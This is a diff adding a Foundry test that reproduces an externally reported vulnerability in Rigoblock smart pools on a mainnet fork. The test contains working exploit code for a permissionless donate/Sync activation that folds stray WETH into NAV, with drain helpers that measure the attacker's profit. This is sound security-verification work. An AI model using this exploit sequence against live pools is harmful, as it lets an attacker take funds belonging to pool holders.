@@ -9,6 +9,7 @@ import {RealDeploymentFixture} from "../fixtures/RealDeploymentFixture.sol";
 import {ISmartPool} from "../../contracts/protocol/ISmartPool.sol";
 import {IRigoblockPoolProxyFactory} from "../../contracts/protocol/interfaces/IRigoblockPoolProxyFactory.sol";
 import {ISmartPoolActions} from "../../contracts/protocol/interfaces/v4/pool/ISmartPoolActions.sol";
+import {ISmartPoolOwnerActions} from "../../contracts/protocol/interfaces/v4/pool/ISmartPoolOwnerActions.sol";
 import {ISmartPoolState} from "../../contracts/protocol/interfaces/v4/pool/ISmartPoolState.sol";
 import {IERC20} from "../../contracts/protocol/interfaces/IERC20.sol";
 import {IAIntents} from "../../contracts/protocol/extensions/adapters/interfaces/IAIntents.sol";
@@ -2769,5 +2770,315 @@ contract PoCVsRoundTripTest is Test, RealDeploymentFixture {
         console2.log("      ES=0 tolerance bypass - Eth ends with TS = 0, VS = 0, ZERO assets");
         console2.log("  (c) gain: full supply burns with zero reverts; (d) loss: stuck exposure shrinks to");
         console2.log("      the documented negative-residual class, smaller than the trapped state");
+    }
+
+    /*//////////////////////////////////////////////////////////////////////////
+        STRAY-BALANCE JIT CAPTURE via Sync activation (external report, deviykee)
+        //////////////////////////////////////////////////////////////////////////*/
+
+    struct StrayCaptureState {
+        uint256 principal; // attacker's minted base value (raw USDC)
+        uint256 strayWeth; // wei dealt to the pool before activation
+        uint256 strayValue; // stray value in raw USDC (pool oracle)
+        uint256 uBeforeActivate; // 1e6: the stray is invisible to NAV
+        uint256 uAfterActivate; // jumped: the whole stray folded into NAV, no supply offset
+        uint256 attackerWethOut; // wei captured via burnForToken
+        uint256 attackerUsdcOut; // raw USDC recovered via burn
+        uint256 attackerValueOut; // USDC-worth of the attacker's total payout
+        int256 profit; // valueOut - principal
+        uint256 sharesLeft; // unpayable tail (payout exceeds the wallet)
+    }
+
+    /// @notice Burn shares paying the base token (external so try/catch can catch it)
+    function tryDrainBurn(address caller, address pool, uint256 amount) external {
+        vm.prank(caller);
+        ISmartPoolActions(pool).burn(amount, 0);
+    }
+
+    /// @notice Burn shares valued `amount` (base units), paid in WETH (external for try/catch)
+    function tryDrainBurnForToken(address caller, address pool, uint256 amount, address tokenOut) external {
+        vm.prank(caller);
+        ISmartPoolActions(pool).burnForToken(amount, 0, tokenOut);
+    }
+
+    /// @notice Create a fresh USDC-based pool on the mainnet fork (real factory, real oracle)
+    function _createFreshUsdcPool(string memory name, string memory symbol) internal returns (address pool) {
+        vm.prank(poolOwner);
+        (pool, ) = IRigoblockPoolProxyFactory(Constants.FACTORY).createPool(name, symbol, Constants.ETH_USDC);
+    }
+
+    /// @notice THE 3-STEP ATTACK: donate(token, 1, Sync) snapshots balance+NAV, a 2-wei top-up, then
+    ///         donate(token, 2, Sync) processes the delta. On FIRST activation _validateNavIntegrity
+    ///         credits the ENTIRE pre-existing storedBalance into expected NAV while OpType.Sync
+    ///         writes NO virtual supply - the whole stray balance folds into NAV with no supply
+    ///         offset, and the only other guard (NavDecreased) passes because u INCREASES.
+    /// @dev Runs as the attacker. Production requires all three calls inside ONE transaction
+    ///      (the donation lock is EIP-1153 transient storage); Foundry persists tstore across test
+    ///      calls, so the steps can be separate top-level calls here.
+    function _activateStray(address pool, address attacker) internal {
+        DestinationMessageParams memory params = DestinationMessageParams({
+            opType: OpType.Sync,
+            shouldUnwrapNative: false
+        });
+        vm.startPrank(attacker);
+        IECrosschain(pool).donate(Constants.ETH_WETH, 1, params);
+        IERC20(Constants.ETH_WETH).transfer(pool, 2);
+        IECrosschain(pool).donate(Constants.ETH_WETH, 2, params);
+        vm.stopPrank();
+    }
+
+    /// @notice True when `token` is in the pool's active token set (NAV counts its balance)
+    function _isActiveToken(address pool, address token) internal view returns (bool) {
+        address[] memory active = ISmartPoolState(pool).getActiveTokens().activeTokens;
+        for (uint256 i = 0; i < active.length; i++) {
+            if (active[i] == token) return true;
+        }
+        return false;
+    }
+
+    /// @notice Burn `caller`'s ENTIRE balance in payable chunks (base first, then WETH via
+    ///         burnForToken), stopping when neither wallet can pay. Mirrors the existing
+    ///         _operatorBurnEthDry chunking: the pool outflow per share unit is exactly u/1e6
+    ///         (0.999 net + 0.001 to the token jar), so a wallet-sized chunk never overdraws.
+    /// @return wethOut / usdcOut value received (delta), sharesLeft unpayable remainder
+    function _drainShares(
+        address caller,
+        address pool
+    ) internal returns (uint256 wethOut, uint256 usdcOut, uint256 sharesLeft) {
+        uint256 weth0 = IERC20(Constants.ETH_WETH).balanceOf(caller);
+        uint256 usdc0 = IERC20(Constants.ETH_USDC).balanceOf(caller);
+        sharesLeft = ISmartPoolState(pool).balanceOf(caller);
+        uint256 guard;
+        while (sharesLeft > 0) {
+            require(++guard < 30, "drain did not converge");
+            uint256 u = _u(pool);
+            uint256 chunk;
+            bool burned;
+            uint256 maxByUsdc = (IERC20(Constants.ETH_USDC).balanceOf(pool) * 1e6) / u;
+            if (maxByUsdc > 0) {
+                chunk = sharesLeft < maxByUsdc ? sharesLeft : maxByUsdc;
+                try this.tryDrainBurn(caller, pool, chunk) {
+                    sharesLeft -= chunk;
+                    burned = true;
+                } catch {}
+            }
+            if (!burned) {
+                uint256 wethBal = IERC20(Constants.ETH_WETH).balanceOf(pool);
+                uint256 maxByWeth = (uint256(
+                    IEOracle(pool).convertTokenAmount(Constants.ETH_WETH, int256(wethBal), Constants.ETH_USDC)
+                ) * 1e6) / u;
+                if (maxByWeth > 0) {
+                    chunk = sharesLeft < maxByWeth ? sharesLeft : maxByWeth;
+                    try this.tryDrainBurnForToken(caller, pool, chunk, Constants.ETH_WETH) {
+                        sharesLeft -= chunk;
+                        burned = true;
+                    } catch {}
+                }
+            }
+            if (!burned) break; // both wallets dust-dry: the remainder is unpayable
+        }
+        wethOut = IERC20(Constants.ETH_WETH).balanceOf(caller) - weth0;
+        usdcOut = IERC20(Constants.ETH_USDC).balanceOf(caller) - usdc0;
+    }
+
+    function _logStrayCapture(string memory name, StrayCaptureState memory s) internal pure {
+        console2.log("==== STRAY CAPTURE", name);
+        console2.log("  principal (raw):", s.principal);
+        console2.log("  stray WETH (wei) / value (raw):", s.strayWeth, s.strayValue);
+        console2.log("  u before / after activation:", s.uBeforeActivate, s.uAfterActivate);
+        console2.log("  attacker WETH out (wei):", s.attackerWethOut);
+        console2.log("  attacker USDC out (raw):", s.attackerUsdcOut);
+        console2.log("  attacker value out (raw):", s.attackerValueOut);
+        console2.log("  attacker profit (raw):", s.profit);
+        console2.log("  attacker shares left unpayable (raw):", s.sharesLeft);
+    }
+
+    /// @notice EXTERNAL BUG REPORT (researcher deviykee), replicated on the mainnet fork.
+    ///         ECrosschain.donate is permissionless (ECrosschain.sol:23). donate(token, 1, params)
+    ///         snapshots the balance + NAV (lines 50-58); a second donate after a top-up processes
+    ///         the delta; on FIRST ACTIVATION _validateNavIntegrity adds the ENTIRE pre-existing
+    ///         storedBalance into expected NAV (lines 147-153); OpType.Sync writes NO virtual supply
+    ///         (lines 97-102); the only other guard is unitaryValue >= storedNav (line 171) - an
+    ///         INCREASE is unrestricted. So a stray (lost) token balance that predates activation
+    ///         can be folded into NAV with no supply offset by ANYONE: u jumps, and the activator's
+    ///         existing shares (minted while the stray was invisible) are redeemable against it.
+    ///
+    ///         MEASURED ANSWERS: (1) the 3-step sequence runs exactly as the report describes - no
+    ///         deviation needed; the NavDecreased guard does NOT interfere because the activation is
+    ///         always a u-INCREASE, and the balance/whitelist/amountDelta checks all pass by
+    ///         construction. (2) Variant 1 (empty pool): the attacker - sole LP via a ~1 ETH mint -
+    ///         captures ~ALL of the 50 WETH stray (report claimed ~45.85/50: AGREES IN KIND, ours is
+    ///         stronger because the attacker is the only claimant). (3) Variant 2 (existing ~1 ETH
+    ///         LP + attacker ~1 ETH): the attacker captures ~HALF the 20 WETH stray; the LP's shares
+    ///         are unchanged and his claim RISES by the other half - the LP's principal is NOT
+    ///         impaired (the pool stays solvent for him); what he loses vs the no-attacker
+    ///         counterfactual is half the stray uplift, which is exactly the attacker's take.
+    ///         (4) Control: when the WETH arrived via a proper mintWithToken (activated and
+    ///         accounted - shares issued against the full value), the same actions capture NOTHING:
+    ///         the attacker's burn pays back only his own principal minus the spread.
+    function test_StrayBalance_JitCapture_ViaSyncActivate() public {
+        // the fixture creates the forks; this test only uses the mainnet fork + the real factory
+        address[] memory baseTokens = new address[](2);
+        baseTokens[0] = Constants.ETH_USDC;
+        baseTokens[1] = Constants.BASE_USDC;
+        deployFixture(baseTokens);
+        vm.selectFork(mainnetForkId);
+        address attacker = makeAddr("strayAttacker");
+        vm.deal(attacker, 2 ether); // the report's "~2 ETH" attacker funding
+
+        // ================= VARIANT 1: empty pool (the report's main case) =================
+        console2.log("==== VARIANT 1: EMPTY POOL");
+        StrayCaptureState memory v1;
+        address pool1 = _createFreshUsdcPool("StrayOne", "STRY1");
+        v1.strayWeth = 50e18;
+        deal(Constants.ETH_WETH, pool1, v1.strayWeth); // the stray: plain balance, token NOT active
+        deal(Constants.ETH_WETH, attacker, 2); // 2 wei for the top-up step
+
+        // attacker mints ~1 ETH of base while the stray is invisible to NAV
+        v1.principal = uint256(IEOracle(pool1).convertTokenAmount(Constants.ETH_WETH, 1e18, Constants.ETH_USDC));
+        deal(Constants.ETH_USDC, attacker, v1.principal);
+        vm.startPrank(attacker);
+        IERC20(Constants.ETH_USDC).approve(pool1, v1.principal);
+        ISmartPool(payable(pool1)).mint(attacker, v1.principal, 0);
+        vm.stopPrank();
+        v1.uBeforeActivate = _u(pool1);
+        v1.strayValue = uint256(
+            IEOracle(pool1).convertTokenAmount(Constants.ETH_WETH, int256(v1.strayWeth), Constants.ETH_USDC)
+        );
+        assertEq(v1.uBeforeActivate, 1e6, "stray invisible: u pinned at par after the mint");
+        assertTrue(!_isActiveToken(pool1, Constants.ETH_WETH), "stray invisible: WETH not active");
+
+        // the 3-step donate sequence (permissionless, executed by the attacker)
+        _activateStray(pool1, attacker);
+        v1.uAfterActivate = _u(pool1);
+        assertTrue(_isActiveToken(pool1, Constants.ETH_WETH), "attack: WETH activated");
+        assertGt(v1.uAfterActivate, 10e6, "attack: u jumped by the stray/supply ratio");
+        assertApproxEqRel(
+            v1.uAfterActivate,
+            (1e6 * (ISmartPoolActions(pool1).updateUnitaryValue().netTotalValue * 1e6)) /
+                ISmartPoolState(pool1).getPoolTokens().totalSupply /
+                1e6,
+            0.02e18,
+            "attack: u == V/TS (whole stray in NAV, no supply offset)"
+        );
+
+        // wait out the minPeriod lock on the attacker's mint, then capture
+        _warpPastLockup(pool1);
+        (v1.attackerWethOut, v1.attackerUsdcOut, v1.sharesLeft) = _drainShares(attacker, pool1);
+        v1.attackerValueOut =
+            v1.attackerUsdcOut +
+            uint256(
+                IEOracle(pool1).convertTokenAmount(Constants.ETH_WETH, int256(v1.attackerWethOut), Constants.ETH_USDC)
+            );
+        v1.profit = int256(v1.attackerValueOut) - int256(v1.principal);
+        _logStrayCapture("VARIANT 1 (empty pool, 50 WETH stray)", v1);
+        assertGt(v1.attackerWethOut, 45e18, "agrees in kind with the report's ~45.85/50 - here ~all of it");
+        assertApproxEqRel(v1.profit, int256(v1.strayValue), 0.05e18, "profit ~= the whole stray value");
+        assertTrue(v1.profit > 0, "the attacker profits from funds that were not his");
+
+        // ================= VARIANT 2: existing LP =================
+        console2.log("==== VARIANT 2: EXISTING LP");
+        StrayCaptureState memory v2;
+        address pool2 = _createFreshUsdcPool("StrayTwo", "STRY2");
+        uint256 lpPrincipal = uint256(IEOracle(pool2).convertTokenAmount(Constants.ETH_WETH, 1e18, Constants.ETH_USDC));
+        deal(Constants.ETH_USDC, user, lpPrincipal);
+        vm.startPrank(user);
+        IERC20(Constants.ETH_USDC).approve(pool2, lpPrincipal);
+        ISmartPool(payable(pool2)).mint(user, lpPrincipal, 0);
+        vm.stopPrank();
+        _warpPastLockup(pool2); // the LP is free to burn from here on
+
+        // what the LP could burn for BEFORE the attack (real burn on a throwaway snapshot)
+        uint256 lpSharesBefore = ISmartPoolState(pool2).balanceOf(user);
+        uint256 lpBurnX;
+        {
+            uint256 snapLp = vm.snapshot();
+            (, uint256 lpUsdcOut, ) = _drainShares(user, pool2);
+            lpBurnX = lpUsdcOut;
+            assertTrue(vm.revertTo(snapLp), "restore the pre-attack state");
+        }
+        console2.log("  LP principal (raw):", lpPrincipal);
+        console2.log("  LP could burn for X (raw, pre-attack):", lpBurnX);
+
+        // the attack: stray 20 WETH, attacker mints ~1 ETH of base, 3-step activation
+        v2.strayWeth = 20e18;
+        deal(Constants.ETH_WETH, pool2, v2.strayWeth);
+        v2.principal = lpPrincipal; // ~1 ETH of base, matching the LP
+        deal(Constants.ETH_USDC, attacker, v2.principal);
+        vm.startPrank(attacker);
+        IERC20(Constants.ETH_USDC).approve(pool2, v2.principal);
+        ISmartPool(payable(pool2)).mint(attacker, v2.principal, 0);
+        vm.stopPrank();
+        v2.uBeforeActivate = _u(pool2);
+        v2.strayValue = uint256(
+            IEOracle(pool2).convertTokenAmount(Constants.ETH_WETH, int256(v2.strayWeth), Constants.ETH_USDC)
+        );
+        assertEq(v2.uBeforeActivate, 1e6, "stray invisible: u still par with the LP + attacker mints");
+        _activateStray(pool2, attacker);
+        v2.uAfterActivate = _u(pool2);
+        assertGt(v2.uAfterActivate, 3e6, "attack: u jumped ~3x (20 WETH vs ~2 ETH of supply)");
+        assertEq(ISmartPoolState(pool2).balanceOf(user), lpSharesBefore, "LP shares unchanged by the attack");
+
+        // attacker captures his half of the stray
+        _warpPastLockup(pool2);
+        (v2.attackerWethOut, v2.attackerUsdcOut, v2.sharesLeft) = _drainShares(attacker, pool2);
+        v2.attackerValueOut =
+            v2.attackerUsdcOut +
+            uint256(
+                IEOracle(pool2).convertTokenAmount(Constants.ETH_WETH, int256(v2.attackerWethOut), Constants.ETH_USDC)
+            );
+        v2.profit = int256(v2.attackerValueOut) - int256(v2.principal);
+        _logStrayCapture("VARIANT 2 (existing LP, 20 WETH stray)", v2);
+        assertTrue(v2.profit > 0, "attacker profits with an existing LP too");
+        assertGt(v2.attackerWethOut, v2.strayWeth / 4, "attacker skims ~half the stray");
+
+        // LP's realizable value AFTER the attack (real burn, measured on a throwaway snapshot)
+        uint256 lpBurnXPrime;
+        uint256 snapLp2 = vm.snapshot();
+        {
+            (uint256 lpWethOut, uint256 lpUsdcOut, ) = _drainShares(user, pool2);
+            lpBurnXPrime =
+                lpUsdcOut +
+                uint256(IEOracle(pool2).convertTokenAmount(Constants.ETH_WETH, int256(lpWethOut), Constants.ETH_USDC));
+        }
+        assertTrue(vm.revertTo(snapLp2), "restore the post-attack state");
+        console2.log("  LP can burn for X' (raw, post-attack):", lpBurnXPrime);
+        console2.log("  attacker captured (raw USDC-worth):", v2.attackerValueOut - v2.principal);
+        assertGt(lpBurnXPrime, lpBurnX, "LP claim ROSE: his uplift is half the stray (principal intact)");
+        assertApproxEqRel(
+            uint256(v2.profit),
+            v2.strayValue / 2,
+            0.35e18,
+            "attacker's take ~= half the stray - the half the LP's solo uplift lost"
+        );
+        console2.log("  solo-activation counterfactual: LP claim ~= X + stray - halved by the attack");
+
+        // ================= CONTROL: accounted WETH is NOT capturable =================
+        console2.log("==== CONTROL: accounted via mintWithToken");
+        address pool3 = _createFreshUsdcPool("StrayCtl", "STRY3");
+        vm.prank(poolOwner);
+        ISmartPoolOwnerActions(pool3).setAcceptableMintToken(Constants.ETH_WETH, true);
+        deal(Constants.ETH_WETH, poolOwner, 50e18); // pulled from the owner by mintWithToken...
+        vm.startPrank(poolOwner);
+        IERC20(Constants.ETH_WETH).approve(pool3, 50e18);
+        ISmartPoolActions(pool3).mintWithToken(poolOwner, 50e18, 0, Constants.ETH_WETH); // ...accounted
+        vm.stopPrank();
+        uint256 uCtlBefore = _u(pool3);
+        uint256 principal3 = uint256(IEOracle(pool3).convertTokenAmount(Constants.ETH_WETH, 1e18, Constants.ETH_USDC));
+        deal(Constants.ETH_USDC, attacker, principal3);
+        vm.startPrank(attacker);
+        IERC20(Constants.ETH_USDC).approve(pool3, principal3);
+        ISmartPool(payable(pool3)).mint(attacker, principal3, 0);
+        vm.stopPrank();
+        assertApproxEqAbs(_u(pool3), uCtlBefore, 500, "control: no u jump - the WETH value is share-backed");
+        _warpPastLockup(pool3);
+        (uint256 ctlWethOut, uint256 ctlUsdcOut, ) = _drainShares(attacker, pool3);
+        uint256 ctlValueOut = ctlUsdcOut +
+            uint256(IEOracle(pool3).convertTokenAmount(Constants.ETH_WETH, int256(ctlWethOut), Constants.ETH_USDC));
+        int256 ctlProfit = int256(ctlValueOut) - int256(principal3);
+        console2.log("  control attacker value out (raw):", ctlValueOut);
+        console2.log("  control attacker profit (raw):", ctlProfit);
+        assertEq(ctlWethOut, 0, "control: the attacker captures ZERO WETH");
+        assertLe(ctlProfit, 0, "control: he recovers at most his own principal (spread costs only)");
     }
 }
